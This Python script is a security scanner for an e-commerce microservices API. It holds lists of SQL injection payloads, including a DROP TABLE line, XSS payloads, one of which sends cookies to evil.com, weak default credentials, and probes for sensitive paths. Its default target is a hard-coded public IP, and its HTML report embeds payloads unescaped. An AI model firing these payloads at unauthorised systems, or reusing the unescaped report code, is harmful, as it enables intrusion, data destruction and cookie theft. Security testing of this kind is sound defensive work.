#!/usr/bin/env python3
"""
E-commerce Security Test Suite
Advanced security testing for microservices architecture
"""

import requests
import json
import time
import sys
import os
from datetime import datetime
from urllib.parse import urljoin
import argparse
import logging
from concurrent.futures import ThreadPoolExecutor
import yaml

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('security-tests.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class SecurityTestSuite:
    def __init__(self, base_url="http://34.44.242.122:8080"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.timeout = 30
        self.vulnerabilities = []
        self.test_results = {
            'timestamp': datetime.now().isoformat(),
            'target': base_url,
            'tests_run': 0,
            'vulnerabilities_found': 0,
            'services_tested': []
        }
        
        # Microservice endpoints
        self.endpoints = {
            'product_service': '/product-service/api/products',
            'category_service': '/product-service/api/categories',
            'user_service': '/user-service/api/users',
            'address_service': '/user-service/api/address',
            'credential_service': '/user-service/api/credentials',
            'order_service': '/order-service/api/orders',
            'cart_service': '/order-service/api/carts',
            'payment_service': '/payment-service/api/payments',
            'favourite_service': '/favourite-service/api/favourites',
            'shipping_service': '/shipping-service/api/shippings',
            'proxy_client': '/app/api',
            'auth_endpoint': '/app/api/authenticate'
        }

    def log_vulnerability(self, severity, category, description, endpoint, payload=None):
        """Log a discovered vulnerability"""
        vuln = {
            'timestamp': datetime.now().isoformat(),
            'severity': severity,
            'category': category,
            'description': description,
            'endpoint': endpoint,
            'payload': payload
        }
        self.vulnerabilities.append(vuln)
        self.test_results['vulnerabilities_found'] += 1
        
        logger.warning(f"🚨 {severity.upper()} - {category}: {description}")
        if payload:
            logger.warning(f"   Payload: {payload}")

    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        logger.info("🔍 Testing SQL Injection vulnerabilities...")
        
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "1' AND '1'='1",
            "1' OR '1'='1",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' OR 1=1#",
            "' OR 1=1--",
            "' OR 1=1/*",
            "') OR '1'='1--",
            "') OR ('1'='1--"
        ]
        
        # Test authentication endpoint
        auth_url = urljoin(self.base_url, self.endpoints['auth_endpoint'])
        for payload in sql_payloads:
            try:
                test_data = {
                    "username": payload,
                    "password": "test"
                }
                response = self.session.post(auth_url, json=test_data)
                
                if response.status_code == 200:
                    self.log_vulnerability(
                        'HIGH', 
                        'SQL Injection', 
                        'Authentication bypass possible via SQL injection',
                        auth_url,
                        payload
                    )
                elif response.status_code == 500:
                    # Server error might indicate SQL injection
                    if 'sql' in response.text.lower() or 'database' in response.text.lower():
                        self.log_vulnerability(
                            'MEDIUM',
                            'SQL Injection',
                            'SQL error disclosed in response',
                            auth_url,
                            payload
                        )
            except Exception as e:
                logger.debug(f"SQL injection test error: {e}")
        
        # Test GET endpoints with SQL injection
        for service_name, endpoint in self.endpoints.items():
            if service_name in ['auth_endpoint']:
                continue
                
            url = urljoin(self.base_url, endpoint)
            for payload in sql_payloads[:5]:  # Test fewer payloads for GET requests
                try:
                    test_url = f"{url}?id={payload}"
                    response = self.session.get(test_url)
                    
                    if response.status_code == 500:
                        if any(keyword in response.text.lower() for keyword in ['sql', 'database', 'mysql', 'postgresql']):
                            self.log_vulnerability(
                                'MEDIUM',
                                'SQL Injection',
                                f'SQL error disclosed in {service_name}',
                                test_url,
                                payload
                            )
                except Exception as e:
                    logger.debug(f"SQL injection test error for {service_name}: {e}")

    def test_xss(self):
        """Test for Cross-Site Scripting vulnerabilities"""
        logger.info("🔍 Testing XSS vulnerabilities...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "<script>document.location='http://evil.com/'+document.cookie</script>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>"
        ]
        
        # Test form inputs where applicable
        test_endpoints = [
            ('/product-service/api/products', {'productTitle': ''}),
            ('/product-service/api/categories', {'categoryTitle': ''}),
            ('/user-service/api/users', {'firstName': '', 'lastName': ''}),
            ('/user-service/api/address', {'fullAddress': ''}),
        ]
        
        for endpoint, form_data in test_endpoints:
            url = urljoin(self.base_url, endpoint)
            
            for field_name in form_data.keys():
                for payload in xss_payloads[:5]:  # Limit payloads for efficiency
                    try:
                        test_data = form_data.copy()
                        test_data[field_name] = payload
                        
                        response = self.session.post(url, json=test_data)
                        
                        # Check if payload is reflected in response
                        if payload in response.text and response.headers.get('content-type', '').startswith('text/html'):
                            self.log_vulnerability(
                                'HIGH',
                                'Cross-Site Scripting (XSS)',
                                f'Reflected XSS in {field_name}',
                                url,
                                payload
                            )
                    except Exception as e:
                        logger.debug(f"XSS test error: {e}")

    def test_authentication_bypass(self):
        """Test authentication bypass vulnerabilities"""
        logger.info("🔍 Testing authentication bypass...")
        
        auth_url = urljoin(self.base_url, self.endpoints['auth_endpoint'])
        
        # Test weak credentials
        weak_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('admin', 'admin123'),
            ('root', 'root'),
            ('test', 'test'),
            ('user', 'user'),
            ('guest', 'guest'),
            ('', ''),  # Empty credentials
            ('admin', ''),  # Empty password
        ]
        
        for username, password in weak_creds:
            try:
                response = self.session.post(auth_url, json={
                    'username': username,
                    'password': password
                })
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if 'jwtToken' in data or 'token' in data:
                            self.log_vulnerability(
                                'HIGH',
                                'Weak Authentication',
                                f'Weak credentials accepted: {username}:{password}',
                                auth_url,
                                f'{username}:{password}'
                            )
                    except:
                        pass
            except Exception as e:
                logger.debug(f"Auth bypass test error: {e}")

    def test_authorization_bypass(self):
        """Test authorization bypass vulnerabilities"""
        logger.info("🔍 Testing authorization bypass...")
        
        # Test accessing protected endpoints without authentication
        protected_endpoints = [
            '/user-service/api/users',
            '/order-service/api/orders',
            '/payment-service/api/payments',
            '/user-service/api/credentials'
        ]
        
        for endpoint in protected_endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                response = self.session.get(url)
                
                if response.status_code == 200:
                    self.log_vulnerability(
                        'HIGH',
                        'Authorization Bypass',
                        f'Protected endpoint accessible without authentication',
                        url
                    )
                elif response.status_code not in [401, 403]:
                    # Unexpected response might indicate issues
                    logger.info(f"Unexpected response {response.status_code} for {url}")
            except Exception as e:
                logger.debug(f"Authorization test error: {e}")

    def test_cors_misconfiguration(self):
        """Test CORS misconfiguration vulnerabilities"""
        logger.info("🔍 Testing CORS misconfiguration...")
        
        malicious_origins = [
            'http://malicious-site.com',
            'https://evil.com',
            'http://localhost:3000',
            'null'
        ]
        
        for endpoint_name, endpoint_path in self.endpoints.items():
            if endpoint_name == 'auth_endpoint':
                continue
                
            url = urljoin(self.base_url, endpoint_path)
            
            for origin in malicious_origins:
                try:
                    headers = {
                        'Origin': origin,
                        'Access-Control-Request-Method': 'POST',
                        'Access-Control-Request-Headers': 'Content-Type'
                    }
                    
                    response = self.session.options(url, headers=headers)
                    
                    cors_header = response.headers.get('Access-Control-Allow-Origin', '')
                    
                    if cors_header == '*':
                        self.log_vulnerability(
                            'MEDIUM',
                            'CORS Misconfiguration',
                            f'CORS allows all origins (*) for {endpoint_name}',
                            url
                        )
                    elif cors_header == origin:
                        self.log_vulnerability(
                            'MEDIUM',
                            'CORS Misconfiguration',
                            f'CORS allows malicious origin {origin} for {endpoint_name}',
                            url,
                            origin
                        )
                except Exception as e:
                    logger.debug(f"CORS test error: {e}")

    def test_information_disclosure(self):
        """Test for information disclosure vulnerabilities"""
        logger.info("🔍 Testing information disclosure...")
        
        # Test common sensitive files/endpoints
        sensitive_paths = [
            '/actuator/health',
            '/actuator/env',
            '/actuator/configprops',
            '/actuator/mappings',
            '/swagger-ui.html',
            '/v2/api-docs',
            '/api/v1/swagger.json',
            '/health',
            '/info',
            '/metrics',
            '/trace',
            '/dump',
            '/.env',
            '/config',
            '/admin',
            '/debug'
        ]
        
        for path in sensitive_paths:
            url = urljoin(self.base_url, path)
            try:
                response = self.session.get(url)
                
                if response.status_code == 200:
                    # Check for sensitive information
                    content = response.text.lower()
                    sensitive_keywords = ['password', 'secret', 'key', 'token', 'database', 'config']
                    
                    if any(keyword in content for keyword in sensitive_keywords):
                        self.log_vulnerability(
                            'MEDIUM',
                            'Information Disclosure',
                            f'Sensitive information exposed at {path}',
                            url
                        )
                    else:
                        logger.info(f"Accessible endpoint found: {path}")
            except Exception as e:
                logger.debug(f"Info disclosure test error: {e}")

    def test_http_methods(self):
        """Test for dangerous HTTP methods"""
        logger.info("🔍 Testing dangerous HTTP methods...")
        
        dangerous_methods = ['TRACE', 'TRACK', 'DELETE', 'PUT', 'PATCH']
        
        for endpoint_name, endpoint_path in self.endpoints.items():
            url = urljoin(self.base_url, endpoint_path)
            
            for method in dangerous_methods:
                try:
                    response = self.session.request(method, url)
                    
                    if response.status_code not in [405, 501, 404]:
                        severity = 'HIGH' if method in ['TRACE', 'TRACK'] else 'MEDIUM'
                        self.log_vulnerability(
                            severity,
                            'HTTP Method',
                            f'Dangerous HTTP method {method} allowed on {endpoint_name}',
                            url,
                            method
                        )
                except Exception as e:
                    logger.debug(f"HTTP method test error: {e}")

    def test_security_headers(self):
        """Test for missing security headers"""
        logger.info("🔍 Testing security headers...")
        
        required_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': None,  # Any value is good
            'Content-Security-Policy': None,
            'Referrer-Policy': None
        }
        
        for endpoint_name, endpoint_path in self.endpoints.items():
            url = urljoin(self.base_url, endpoint_path)
            
            try:
                response = self.session.get(url)
                
                for header, expected_value in required_headers.items():
                    if header not in response.headers:
                        self.log_vulnerability(
                            'LOW',
                            'Missing Security Header',
                            f'Missing {header} header on {endpoint_name}',
                            url
                        )
                    elif expected_value and isinstance(expected_value, list):
                        if response.headers[header] not in expected_value:
                            self.log_vulnerability(
                                'LOW',
                                'Weak Security Header',
                                f'Weak {header} value on {endpoint_name}',
                                url,
                                response.headers[header]
                            )
            except Exception as e:
                logger.debug(f"Security headers test error: {e}")

    def run_all_tests(self):
        """Run all security tests"""
        logger.info("🚀 Starting comprehensive security test suite...")
        
        tests = [
            self.test_sql_injection,
            self.test_xss,
            self.test_authentication_bypass,
            self.test_authorization_bypass,
            self.test_cors_misconfiguration,
            self.test_information_disclosure,
            self.test_http_methods,
            self.test_security_headers
        ]
        
        for test in tests:
            try:
                test()
                self.test_results['tests_run'] += 1
            except Exception as e:
                logger.error(f"Test failed: {test.__name__} - {e}")
        
        self.generate_report()

    def generate_report(self):
        """Generate comprehensive security report"""
        logger.info("📋 Generating security report...")
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"security-reports/security_report_{timestamp}.html"
        
        # Ensure directory exists
        os.makedirs("security-reports", exist_ok=True)
        
        # Categorize vulnerabilities by severity
        high_vulns = [v for v in self.vulnerabilities if v['severity'] == 'HIGH']
        medium_vulns = [v for v in self.vulnerabilities if v['severity'] == 'MEDIUM']
        low_vulns = [v for v in self.vulnerabilities if v['severity'] == 'LOW']
        
        html_report = f"""
<!DOCTYPE html>
<html>
<head>
    <title>E-commerce Security Test Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .header {{ background-color: #f0f0f0; padding: 20px; border-radius: 5px; }}
        .summary {{ margin: 20px 0; }}
        .vulnerability {{ margin: 10px 0; padding: 15px; border-radius: 5px; }}
        .high {{ background-color: #ffebee; border-left: 5px solid #f44336; }}
        .medium {{ background-color: #fff3e0; border-left: 5px solid #ff9800; }}
        .low {{ background-color: #e8f5e8; border-left: 5px solid #4caf50; }}
        .code {{ background-color: #f5f5f5; padding: 5px; font-family: monospace; }}
        .stats {{ display: flex; justify-content: space-around; margin: 20px 0; }}
        .stat {{ text-align: center; padding: 15px; background-color: #f5f5f5; border-radius: 5px; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🛡️ E-commerce Security Test Report</h1>
        <p><strong>Target:</strong> {self.base_url}</p>
        <p><strong>Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p><strong>Tests Run:</strong> {self.test_results['tests_run']}</p>
    </div>

    <div class="stats">
        <div class="stat">
            <h3>{len(high_vulns)}</h3>
            <p>High Risk</p>
        </div>
        <div class="stat">
            <h3>{len(medium_vulns)}</h3>
            <p>Medium Risk</p>
        </div>
        <div class="stat">
            <h3>{len(low_vulns)}</h3>
            <p>Low Risk</p>
        </div>
        <div class="stat">
            <h3>{len(self.vulnerabilities)}</h3>
            <p>Total Issues</p>
        </div>
    </div>

    <div class="summary">
        <h2>📊 Executive Summary</h2>
        <p>This automated security assessment identified <strong>{len(self.vulnerabilities)}</strong> potential security issues across the e-commerce microservices architecture.</p>
        
        {'<p><strong>⚠️ CRITICAL:</strong> High-risk vulnerabilities found that require immediate attention!</p>' if high_vulns else ''}
        {'<p><strong>✅ GOOD:</strong> No high-risk vulnerabilities detected.</p>' if not high_vulns else ''}
    </div>
"""

        # Add vulnerabilities by severity
        for severity, vulns, color in [('HIGH', high_vulns, 'high'), 
                                      ('MEDIUM', medium_vulns, 'medium'), 
                                      ('LOW', low_vulns, 'low')]:
            if vulns:
                html_report += f"""
    <h2>🚨 {severity} Risk Vulnerabilities ({len(vulns)})</h2>
"""
                for vuln in vulns:
                    payload_html = f"<div class='code'>Payload: {vuln['payload']}</div>" if vuln['payload'] else ""
                    html_report += f"""
    <div class="vulnerability {color}">
        <h3>{vuln['category']}</h3>
        <p><strong>Description:</strong> {vuln['description']}</p>
        <p><strong>Endpoint:</strong> <code>{vuln['endpoint']}</code></p>
        {payload_html}
        <p><strong>Timestamp:</strong> {vuln['timestamp']}</p>
    </div>
"""

        html_report += """
    <div class="summary">
        <h2>🔧 Recommendations</h2>
        <ul>
            <li><strong>Fix HIGH risk vulnerabilities immediately</strong></li>
            <li><strong>Implement input validation and sanitization</strong></li>
            <li><strong>Add proper authentication and authorization checks</strong></li>
            <li><strong>Configure security headers correctly</strong></li>
            <li><strong>Review CORS configuration</strong></li>
            <li><strong>Implement regular security testing in CI/CD</strong></li>
        </ul>
    </div>
</body>
</html>
"""
        
        with open(report_file, 'w') as f:
            f.write(html_report)
        
        # Also generate JSON report
        json_report_file = f"security-reports/security_report_{timestamp}.json"
        with open(json_report_file, 'w') as f:
            json.dump({
                'test_results': self.test_results,
                'vulnerabilities': self.vulnerabilities
            }, f, indent=2)
        
        logger.info(f"✅ Reports generated:")
        logger.info(f"   HTML: {report_file}")
        logger.info(f"   JSON: {json_report_file}")
        
        # Print summary
        print(f"\n🛡️  SECURITY TEST SUMMARY")
        print(f"========================")
        print(f"Target: {self.base_url}")
        print(f"Tests Run: {self.test_results['tests_run']}")
        print(f"Total Issues: {len(self.vulnerabilities)}")
        print(f"High Risk: {len(high_vulns)}")
        print(f"Medium Risk: {len(medium_vulns)}")
        print(f"Low Risk: {len(low_vulns)}")

def main():
    parser = argparse.ArgumentParser(description='E-commerce Security Test Suite')
    parser.add_argument('--url', default='http://34.44.242.122:8080', 
                       help='Target URL (default: http://34.44.242.122:8080)')
    parser.add_argument('--test', choices=['sql', 'xss', 'auth', 'cors', 'headers', 'all'],
                       default='all', help='Specific test to run')
    
    args = parser.parse_args()
    
    suite = SecurityTestSuite(args.url)
    
    if args.test == 'all':
        suite.run_all_tests()
    elif args.test == 'sql':
        suite.test_sql_injection()
        suite.generate_report()
    elif args.test == 'xss':
        suite.test_xss()
        suite.generate_report()
    elif args.test == 'auth':
        suite.test_authentication_bypass()
        suite.test_authorization_bypass()
        suite.generate_report()
    elif args.test == 'cors':
        suite.test_cors_misconfiguration()
        suite.generate_report()
    elif args.test == 'headers':
        suite.test_security_headers()
        suite.generate_report()

if __name__ == "__main__":
    main()